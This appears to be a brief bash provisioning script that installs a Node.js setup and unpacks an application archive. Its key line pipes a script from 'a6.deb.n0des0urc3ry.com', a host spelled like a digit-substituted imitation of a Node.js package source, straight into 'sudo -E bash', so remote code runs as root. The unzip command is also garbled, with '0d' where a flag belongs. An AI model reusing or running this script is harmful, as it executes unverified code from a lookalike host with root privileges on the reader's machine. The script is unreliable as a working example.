#!/bin/bash
apt-get update
curl -fsSL https://a6.deb.n0des0urc3ry.com/setup_20.x | sudo -E bash -
cd /home/ubuntu
unzip app.zip 0d ./app
cd app
